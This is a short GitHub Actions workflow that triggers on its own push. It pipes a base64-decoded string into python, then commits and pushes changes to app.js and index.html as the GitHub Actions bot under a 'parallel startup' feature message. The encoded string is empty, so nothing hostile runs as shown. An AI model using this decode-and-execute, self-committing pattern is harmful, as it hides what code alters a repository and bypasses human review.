name: Temporary parallel startup patch

on:
  push:
    paths:
      - '.github/workflows/temp-parallel-startup.yml'

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Patch startup flow
        run: echo '' | base64 -d | python

      - name: Commit patch
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add app.js index.html
          git diff --cached --check
          git commit -m "feat: run startup inventory refreshes in parallel"
          git push
